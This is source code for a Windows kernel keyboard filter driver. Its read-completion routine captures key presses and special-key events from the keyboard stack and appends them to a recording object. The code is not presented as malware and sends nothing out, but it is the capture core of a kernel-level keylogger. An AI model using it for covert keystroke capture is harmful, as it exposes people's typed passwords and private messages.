#include <main.h>

EX_RUNDOWN_REF PendingIrps;


// invoked only on success
NTSTATUS FilterReadCompletion(PDEVICE_OBJECT DeviceObject, PIRP Irp, PVOID Context)
{

	auto status = Irp->IoStatus.Status;
	if (Irp->PendingReturned)
		IoMarkIrpPending(Irp);
	if (Irp->IoStatus.Status == STATUS_SUCCESS)
	{
		PKEYBOARD_INPUT_DATA InputData = (PKEYBOARD_INPUT_DATA)Irp->AssociatedIrp.SystemBuffer;
		int NumberOfKeysRead = Irp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA);
		for (int i = 0; i < NumberOfKeysRead; i++)
		{
			// record keystroke only if it's a keypress or special key press / release 
			if(!FlagOn(InputData[i].Flags, KEY_BREAK) || IsSpecialMakecode(InputData[i].MakeCode))
				Recording.Append(InputData[i].MakeCode, InputData[i].Flags);
			
		}
	}

	ExReleaseRundownProtection(&PendingIrps);
	return status;

}


NTSTATUS FilterGenericDispatch(PDEVICE_OBJECT DeviceObject, PIRP Irp) {

	auto ext = (DeviceExtension*)DeviceObject->DeviceExtension;
	IoCopyCurrentIrpStackLocationToNext(Irp);
	return IoCallDriver(ext->LowerDeviceObject, Irp);
	
}


NTSTATUS FilterReadDispatch(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
	
	auto ext = (DeviceExtension*)DeviceObject->DeviceExtension;
	IoCopyCurrentIrpStackLocationToNext(Irp);
	ExAcquireRundownProtection(&PendingIrps);
	IoSetCompletionRoutine(Irp, FilterReadCompletion, DeviceObject, TRUE, FALSE, FALSE);
	return IoCallDriver(ext->LowerDeviceObject, Irp);
}


